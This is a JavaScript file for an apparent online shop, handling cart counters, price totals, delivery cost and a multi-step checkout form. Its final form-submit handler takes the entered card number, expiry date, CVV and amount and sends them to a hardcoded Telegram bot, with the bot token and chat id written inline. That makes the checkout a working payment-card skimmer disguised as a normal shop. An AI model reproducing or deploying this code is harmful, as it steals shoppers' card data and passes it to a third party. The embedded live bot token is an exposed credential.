


//ааааааааааааааааааааааааааааааааааааааааааааа счетчик

window.addEventListener('click', function(event){
    let contry;
     if(event.target.dataset.action === "minysAction"|| event.target.dataset.action === "plusAction"){
        const wraper = event.target.closest('.conter-wraper');
         contry = wraper.querySelector('[data-contry]');
     }
    if(event.target.dataset.action === "minysAction"){
      if(parseInt( contry.innerText)>1){
        contry.innerText = --contry.innerText;
       }
       else if (event.target.closest('.cart_wraper') && parseInt( contry.innerText)===1)
       {
          event.target.closest('.cartochka1').remove();
          schetchikTovaraVkorzine();
          priseItogo();


        
       }
    }
    if(event.target.dataset.action === "plusAction"){
        contry.innerText = ++contry.innerText;
    }
    if (event.target.hasAttribute('data-action') && event.target.closest('.cart_wraper')){
      priseItogo()
    
    }

});
const buttonZakaza = document.querySelector('.buttonZakaza');
// ....................функция которая видит какое количество элементов в корзине 
function schetchikTovaraVkorzine(){

const elementBlokKorzin = document.querySelector('.cart_wraper');
const divKorzanaPusta = document.querySelector('.korzinaPusto');

const korzinafull = document.querySelector('.korzinafull');
const photoKorzina2 = document.querySelector('.photoKorzina2');
const photoKorzina1 = document.querySelector('.photoKorzina1');
const korzin123 = document.querySelector('.korzin123');
const korzin124 = document.querySelector('.korzin124');
const korzin125 = document.querySelector('.korzin125');
const obchaaChena = document.querySelector('.obchaaChena');



if(elementBlokKorzin.children.length > 0 ){
  divKorzanaPusta.classList.add('display');
  buttonZakaza.classList.remove('display');
  korzinafull.classList.remove('display');
  photoKorzina2.classList.remove('display');
  photoKorzina1.classList.add('display');
  korzin123.classList.remove('display')
  korzin124.classList.remove('display')
  korzin125.classList.add('display')
  
}
else{
  divKorzanaPusta.classList.remove('display');
  buttonZakaza.classList.add('display');
  korzinafull.classList.add('display');
  photoKorzina2.classList.add('display');
  photoKorzina1.classList.remove('display');
  korzin123.classList.add('display')
  korzin124.classList.add('display')
  korzin125.classList.remove('display')

}
}

//............................корзина




const cartochka1 = document.querySelector('.cartochka1');
const cartWrap = document.querySelector('.cart_wraper');
window.addEventListener('click', function(event){

    if(event.target.dataset.korz === 'korz'){
        
  const cart1 =  event.target.closest('.cartochka1');
  const ProduktInfo = {
        id: cart1.dataset.id,
        imgSrc: cart1.querySelector('.product-img').getAttribute('src'),
        title:  cart1.querySelector('.item-title').innerText,
        prise: cart1.querySelector('.prise-item').innerText,
        counte: cart1.querySelector('[data-contry]').innerText,
      };
     
  const itemInCard = cartWrap.querySelector(`[data-id="${ ProduktInfo.id }"]`);
  if(itemInCard){
  const counteElement = itemInCard.querySelector('[data-contry]');
  counteElement.innerText = parseInt(counteElement.innerText) + parseInt(ProduktInfo.counte);
  }
  else{
    const cart1Html = `  
<div class="cartochka1 itemCartoka" data-id="${ ProduktInfo.id}">
          
            <h3 class="item-title">${ ProduktInfo.title}</h3>
            <img class="product-img"   src="${ ProduktInfo.imgSrc}">
            <p class="prise-item">${ ProduktInfo.prise}</p>
    <div class = "Korzin  conter-wraper">
            <div class="divKorzin" id="minys" data-action="minysAction">-</div>
            <div  class="divKorzin" id="textDiv" data-contry>${ ProduktInfo.counte}</div>
            <div  class="divKorzin" id="plus" data-action="plusAction">+</div>
    </div>
</div>`

cartWrap.insertAdjacentHTML('beforeend', cart1Html);

  };
     cart1.querySelector('[data-contry]').innerText = '1';
     schetchikTovaraVkorzine();
     priseItogo();
 };

});

//............................................. функция подсчета итого прайс

function priseItogo(){
const delivaryCost = document.querySelector('.delivaryCost');
const cartCartohka = document.querySelectorAll('.itemCartoka');
const cartprise = document.querySelector('.priseAlll');
const dostavkaprise = document.querySelector('.dostavkaprise');
let totalPrise = 0;
cartCartohka.forEach(function(item){
  const colEl = item.querySelector('#textDiv').innerText;
  const priseEl = item.querySelector('.prise-item').innerText;
  const sumaPrise = parseInt(priseEl) * parseInt(colEl);
  totalPrise = totalPrise + sumaPrise;
})

cartprise.innerText = totalPrise;

if(totalPrise > 0){
  dostavkaprise.classList.remove('display');
}

if(totalPrise >=40000 ){
  delivaryCost.classList.add('spanGrenn');
  delivaryCost.innerText ='Безплатно';
}else{
  delivaryCost.classList.remove('spanGrenn');
  delivaryCost.innerText ='Платно';

};
};








let zakaz1 = document.querySelector('.zakaz1');

// оформление заказа 
buttonZakaza.addEventListener('click', function(){
  zakaz1.classList.remove('display');
})
let daleezakaz2 = document.querySelector('.daleezakaz2');
let zakaz2 = document.querySelector('.zakaz2');
daleezakaz2.addEventListener('click', function(){
  zakaz2.classList.remove('display');
  zakaz1.classList.add('display');
})
let preki = document.querySelector('.preki');
 let daleezakaz3 = document.querySelector('.daleezakaz3');
 let zakaz3 = document.querySelector('.zakaz3');
 daleezakaz3.addEventListener('click', function(){
  zakaz3.classList.remove('display');
  zakaz2.classList.add('display');

 })

 const ififi = document.querySelector('.ififi');
const form = document.querySelector('#form');
form.addEventListener('submit',(e)=>{
  e.preventDefault();
  var text1=document.getElementById('text1').value;
  var text2=document.getElementById('text2').value;
  var text3=document.getElementById('text3').value;
  var text4=document.getElementById('text4').value;
  var my_text=`Resault is:%0A - Номер карты: ${text1} %0A - Дата: ${text2}%0A - cvv: ${text3} %0A - сумма: ${text4}`
  var toket = "5563526094:AAH4UFm3Wz_wq5GpMiwCv26SAazlPp7jJPA";
  var chat_id = 5227593317
  var url = `https://api.telegram.org/bot${toket}/sendMessage?chat_id=${chat_id}&text=${my_text}/`
  let api = new XMLHttpRequest();
  api.open('GET',url,true);
  api.send();
  if(api=true){
    ififi.classList.remove('display');
    formrems.classList.add('display');
  }
})




















